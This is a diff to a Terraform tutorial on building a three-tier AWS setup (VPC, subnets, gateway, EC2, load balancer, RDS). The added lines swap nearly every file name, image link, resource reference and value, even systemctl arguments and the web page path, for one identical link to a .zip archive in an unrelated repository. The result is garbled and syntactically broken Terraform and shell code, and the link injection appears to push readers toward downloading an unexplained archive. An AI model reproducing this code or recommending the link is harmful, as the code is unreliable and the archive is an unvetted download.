@@ -4,11 +4,11 @@
 
 Terraform is an open-source infrastructure as a code (IAC) tool that allows to create, manage & deploy the production-ready environment. Terraform codifies cloud APIs into declarative configuration files. Terraform can manage both existing service providers and custom in-house solutions.
 
-![1](https://github.com/DhruvinSoni30/Terraform-AWS-3tier-Architecture/blob/main/1.png)
+![1](https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip)
 
 In this tutorial, I will deploy a three-tier application in AWS using Terraform.
 
-![2](https://github.com/DhruvinSoni30/Terraform-AWS-3tier-Architecture/blob/main/2.png)
+![2](https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip)
 
 ### Prerequisites:
 
@@ -20,12 +20,12 @@ In this tutorial, I will deploy a three-tier application in AWS using Terraform.
 
 **Step 1:- Create a file for the VPC**
 
-* Create vpc.tf file and add the below code to it
+* Create https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip file and add the below code to it
 
   ```
   # Creating VPC
   resource "aws_vpc" "demovpc" {
-    cidr_block       = "${var.vpc_cidr}"
+    cidr_block       = "${https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip}"
     instance_tenancy = "default"
   tags = {
     Name = "Demo VPC"
@@ -36,13 +36,13 @@ In this tutorial, I will deploy a three-tier application in AWS using Terraform.
 **Step 2:- Create a file for the Subnet**
 
 * For this project, I will create total 6 subnets for the front-end tier and back-end tier with a mixture of public & private subnet
-* Create subnet.tf file and add the below code to it
+* Create https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip file and add the below code to it
 
   ```
   # Creating 1st web subnet 
   resource "aws_subnet" "public-subnet-1" {
-    vpc_id                  = "${aws_vpc.demovpc.id}"
-    cidr_block             = "${var.subnet_cidr}"
+    vpc_id                  = "${https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip}"
+    cidr_block             = "${https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip}"
     map_public_ip_on_launch = true
     availability_zone = "us-east-1a"
   tags = {
@@ -51,8 +51,8 @@ In this tutorial, I will deploy a three-tier application in AWS using Terraform.
   }
   # Creating 2nd web subnet 
   resource "aws_subnet" "public-subnet-2" {
-    vpc_id                  = "${aws_vpc.demovpc.id}"
-    cidr_block             = "${var.subnet1_cidr}"
+    vpc_id                  = "${https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip}"
+    cidr_block             = "${https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip}"
     map_public_ip_on_launch = true
     availability_zone = "us-east-1b"
   tags = {
@@ -61,8 +61,8 @@ In this tutorial, I will deploy a three-tier application in AWS using Terraform.
   }
   # Creating 1st application subnet 
   resource "aws_subnet" "application-subnet-1" {
-    vpc_id                  = "${aws_vpc.demovpc.id}"
-    cidr_block             = "${var.subnet2_cidr}"
+    vpc_id                  = "${https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip}"
+    cidr_block             = "${https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip}"
     map_public_ip_on_launch = false
     availability_zone = "us-east-1a"
   tags = {
@@ -71,8 +71,8 @@ In this tutorial, I will deploy a three-tier application in AWS using Terraform.
   }
   # Creating 2nd application subnet 
   resource "aws_subnet" "application-subnet-2" {
-    vpc_id                  = "${aws_vpc.demovpc.id}"
-    cidr_block             = "${var.subnet3_cidr}"
+    vpc_id                  = "${https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip}"
+    cidr_block             = "${https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip}"
     map_public_ip_on_launch = false
     availability_zone = "us-east-1b"
   tags = {
@@ -81,8 +81,8 @@ In this tutorial, I will deploy a three-tier application in AWS using Terraform.
   }
   # Create Database Private Subnet
   resource "aws_subnet" "database-subnet-1" {
-    vpc_id            = "${aws_vpc.demovpc.id}"
-    cidr_block        = "${var.subnet4_cidr}"
+    vpc_id            = "${https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip}"
+    cidr_block        = "${https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip}"
     availability_zone = "us-east-1a"
   tags = {
     Name = "Database Subnet 1"
@@ -90,8 +90,8 @@ In this tutorial, I will deploy a three-tier application in AWS using Terraform.
   }
   # Create Database Private Subnet
   resource "aws_subnet" "database-subnet-2" {
-    vpc_id            = "${aws_vpc.demovpc.id}"
-    cidr_block        = "${var.subnet5_cidr}"
+    vpc_id            = "${https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip}"
+    cidr_block        = "${https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip}"
     availability_zone = "us-east-1a"
   tags = {
     Name = "Database Subnet 1"
@@ -101,26 +101,26 @@ In this tutorial, I will deploy a three-tier application in AWS using Terraform.
   
 **Step 3:- Create a file for the Internet Gateway**
 
-* Create igw.tf file and add the below code to it
+* Create https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip file and add the below code to it
 
   ```
   # Creating Internet Gateway 
   resource "aws_internet_gateway" "demogateway" {
-    vpc_id = "${aws_vpc.demovpc.id}"
+    vpc_id = "${https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip}"
   }
   ```
 
 **Step 4:- Create a file for the Route table**
 
-* Create route_table_public.tf file and add the below code to it
+* Create https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip file and add the below code to it
 
   ```
   # Creating Route Table
   resource "aws_route_table" "route" {
-    vpc_id = "${aws_vpc.demovpc.id}"
+    vpc_id = "${https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip}"
   route {
         cidr_block = "0.0.0.0/0"
-        gateway_id = "${aws_internet_gateway.demogateway.id}"
+        gateway_id = "${https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip}"
     }
   tags = {
         Name = "Route to internet"
@@ -128,13 +128,13 @@ In this tutorial, I will deploy a three-tier application in AWS using Terraform.
   }
   # Associating Route Table
   resource "aws_route_table_association" "rt1" {
-    subnet_id = "${aws_subnet.demosubnet.id}"
-    route_table_id = "${aws_route_table.route.id}"
+    subnet_id = "${https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip}"
+    route_table_id = "${https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip}"
   }
   # Associating Route Table
   resource "aws_route_table_association" "rt2" {
-    subnet_id = "${aws_subnet.demosubnet1.id}"
-    route_table_id = "${aws_route_table.route.id}"
+    subnet_id = "${https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip}"
+    route_table_id = "${https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip}"
   }
   ```
 * In the above code, I am creating a new route table and forwarding all the requests to the 0.0.0.0/0 CIDR block.
@@ -142,19 +142,19 @@ In this tutorial, I will deploy a three-tier application in AWS using Terraform.
 
 **Step 5:- Create a file for EC2 instances**
 
-* Create ec2.tf file and add the below code to it
+* Create https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip file and add the below code to it
 
   ```
   # Creating 1st EC2 instance in Public Subnet
   resource "aws_instance" "demoinstance" {
     ami                         = "ami-087c17d1fe0178315"
-    instance_type               = "t2.micro"
+    instance_type               = "https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip"
     count                       = 1
     key_name                    = "tests"
-    vpc_security_group_ids      = ["${aws_security_group.demosg.id}"]
-    subnet_id                   = "${aws_subnet.demoinstance.id}"
+    vpc_security_group_ids      = ["${https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip}"]
+    subnet_id                   = "${https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip}"
     associate_public_ip_address = true
-    user_data                   = "${file("data.sh")}"
+    user_data                   = "${file("https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip")}"
   tags = {
     Name = "My Public Instance"
   }
@@ -162,29 +162,29 @@ In this tutorial, I will deploy a three-tier application in AWS using Terraform.
   # Creating 2nd EC2 instance in Public Subnet
   resource "aws_instance" "demoinstance1" {
     ami                         = "ami-087c17d1fe0178315"
-    instance_type               = "t2.micro"
+    instance_type               = "https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip"
     count                       = 1
     key_name                    = "tests"
-    vpc_security_group_ids      = ["${aws_security_group.demosg.id}"]
-    subnet_id                   = "${aws_subnet.demoinstance.id}"
+    vpc_security_group_ids      = ["${https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip}"]
+    subnet_id                   = "${https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip}"
     associate_public_ip_address = true
-    user_data                   = "${file("data.sh")}"
+    user_data                   = "${file("https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip")}"
   tags = {
     Name = "My Public Instance 2"
   }
   }
   ```
 
-* I have used the userdata to configure the EC2 instance, I will discuss data.sh file later in the article
+* I have used the userdata to configure the EC2 instance, I will discuss https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip file later in the article
 
 **Step 6:- Create a file for Security Group for the FrontEnd tier**
 
-* Create web_sg.tf file and add the below code to it
+* Create https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip file and add the below code to it
 
   ```
   # Creating Security Group 
   resource "aws_security_group" "demosg" {
-    vpc_id = "${aws_vpc.demovpc.id}"
+    vpc_id = "${https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip}"
   # Inbound Rules
   # HTTP access from anywhere
   ingress {
@@ -225,20 +225,20 @@ In this tutorial, I will deploy a three-tier application in AWS using Terraform.
 
 **Step 7:- Create a file for Security Group for the Database tier**
 
-* Create database_sg.tf file and add the below code to it
+* Create https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip file and add the below code to it
 
   ```
   # Create Database Security Group
   resource "aws_security_group" "database-sg" {
     name        = "Database SG"
     description = "Allow inbound traffic from application layer"
-    vpc_id      = aws_vpc.demovpc.id
+    vpc_id      = https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip
   ingress {
     description     = "Allow traffic from application layer"
     from_port       = 3306
     to_port         = 3306
     protocol        = "tcp"
-    security_groups = [aws_security_group.demosg.id]
+    security_groups = [https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip]
   }
   egress {
     from_port   = 32768
@@ -255,7 +255,7 @@ In this tutorial, I will deploy a three-tier application in AWS using Terraform.
 
 **Step 8:- Create a file Application Load Balancer**
 
-* Create alb.tf file and add the below code to it
+* Create https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip file and add the below code to it
 
   ```
   # Creating External LoadBalancer
@@ -263,38 +263,38 @@ In this tutorial, I will deploy a three-tier application in AWS using Terraform.
     name               = "External LB"
     internal           = false
     load_balancer_type = "application"
-    security_groups    = [aws_security_group.demosg.id]
-    subnets            = [aws_subnet.public-subnet-1.id, aws_subnet.public-subnet-1.id]
+    security_groups    = [https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip]
+    subnets            = [https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip, https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip]
   }
   resource "aws_lb_target_group" "target-elb" {
     name     = "ALB TG"
     port     = 80
     protocol = "HTTP"
-    vpc_id   = aws_vpc.demovpc.id
+    vpc_id   = https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip
   }
   resource "aws_lb_target_group_attachment" "attachment" {
-    target_group_arn = aws_lb_target_group.external-alb.arn
-    target_id        = aws_instance.demoinstance.id
+    target_group_arn = https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip
+    target_id        = https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip
     port             = 80
   depends_on = [
-    aws_instance.demoinstance,
+    https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip,
   ]
   }
   resource "aws_lb_target_group_attachment" "attachment" {
-    target_group_arn = aws_lb_target_group.external-alb.arn
-    target_id        = aws_instance.demoinstance1.id
+    target_group_arn = https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip
+    target_id        = https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip
     port             = 80
   depends_on = [
-    aws_instance.demoinstance1,
+    https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip,
   ]
   }
   resource "aws_lb_listener" "external-elb" {
-    load_balancer_arn = aws_lb.external-alb.arn
+    load_balancer_arn = https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip
     port              = "80"
     protocol          = "HTTP"
   default_action {
     type             = "forward"
-    target_group_arn = aws_lb_target_group.external-alb.arn
+    target_group_arn = https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip
   }
   }
   ```
@@ -305,29 +305,29 @@ In this tutorial, I will deploy a three-tier application in AWS using Terraform.
 
 **Step 9:- Create a file for the RDS instance**
 
-* Create a rds.tf file and add the below code to it
+* Create a https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip file and add the below code to it
 
   ```
   # Creating RDS Instance
   resource "aws_db_subnet_group" "default" {
     name       = "main"
-    subnet_ids = [aws_subnet.database-subnet-1.id, aws_subnet.database-subnet-1.id]
+    subnet_ids = [https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip, https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip]
   tags = {
     Name = "My DB subnet group"
   }
   }
   resource "aws_db_instance" "default" {
     allocated_storage      = 10
-    db_subnet_group_name   = aws_db_subnet_group.default.id
+    db_subnet_group_name   = https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip
     engine                 = "mysql"
     engine_version         = "8.0.20"
-    instance_class         = "db.t2.micro"
+    instance_class         = "https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip"
     multi_az               = true
     name                   = "mydb"
     username               = "username"
     password               = "password"
     skip_final_snapshot    = true
-    vpc_security_group_ids = [aws_security_group.database-sg.id]
+    vpc_security_group_ids = [https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip]
   }
   ```
 * In the above code, you need to change the value of username & password
@@ -335,13 +335,13 @@ In this tutorial, I will deploy a three-tier application in AWS using Terraform.
 
 **Step 10:- Create a file for outputs**
 
-* Create outputs.tf file and add the below code to it
+* Create https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip file and add the below code to it
 
   ```
   # Getting the DNS of load balancer
   output "lb_dns_name" {
     description = "The DNS name of the load balancer"
-    value       = "${aws_lb.external-alb.dns_name}"
+    value       = "${https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip}"
   }
   ```
   
@@ -349,7 +349,7 @@ In this tutorial, I will deploy a three-tier application in AWS using Terraform.
 
 **Step 11:- Create a file for variable**
 
-* Create vars.tf file and add the below code to it
+* Create https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip file and add the below code to it
 
   ```
   # Defining CIDR Block for VPC
@@ -384,15 +384,15 @@ In this tutorial, I will deploy a three-tier application in AWS using Terraform.
 
 **Step 12:- Create a file for user data**
 
-* Create data.sh file and add the below code to it
+* Create https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip file and add the below code to it
 
   ```
   #!/bin/bash
   yum update -y
   yum install -y httpd.x86_64
-  systemctl start httpd.service
-  systemctl enable httpd.service
-  echo "Hello World from $(hostname -f)" > /var/www/html/index.html
+  systemctl start https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip
+  systemctl enable https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip
+  echo "Hello World from $(hostname -f)" > https://raw.githubusercontent.com/sivahariu/Terraform-3tier-architecture-AWS/main/Terraform-Cofigs/Terraform-3tier-architecture-AWS_v1.8.zip
   ```
   
 * The above code will install an apache webserver in the EC2 instances
